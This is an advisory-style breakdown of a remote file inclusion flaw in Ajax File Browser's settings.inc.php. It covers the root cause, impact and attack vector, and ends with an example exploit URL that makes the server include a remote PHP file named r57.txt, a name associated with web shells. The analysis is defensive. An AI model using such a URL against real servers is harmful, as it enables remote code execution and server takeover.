Based on the provided content, here's the breakdown of the vulnerability:

**Root cause of vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) flaw.
*   The `settings.inc.php` file in Ajax File Browser uses a user-controlled parameter `approot` in a `require_once` statement, without proper sanitization.

**Weaknesses/vulnerabilities present:**

*   **Remote File Inclusion (RFI):** The application includes a file based on the value of the `approot` parameter, allowing an attacker to include a remote file from a server under their control.
*   Lack of input sanitization of the `approot` parameter

**Impact of exploitation:**

*   An attacker can execute arbitrary code on the server by including a malicious PHP file from a remote location. This could lead to:
    *   Full server compromise.
    *   Data theft.
    *   Denial of service.
    *   Website defacement.

**Attack vectors:**

*   The attacker sends an HTTP request to `_includes/settings.inc.php` with a crafted `approot` parameter that points to a malicious PHP file.

**Required attacker capabilities/position:**

*   The attacker needs to be able to send HTTP requests to the vulnerable server.
*   The attacker needs to host a malicious PHP file on a publicly accessible server.

**Additional Details:**
* The vulnerable code is located in `_includes/settings.inc.php` at line 12:  `require_once($approot. _includes/functions_file.inc.php );`
* The `approot` parameter is not validated or sanitized.
* An example exploit URL is provided: `http://localhost/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://localhost/r57.txt?`
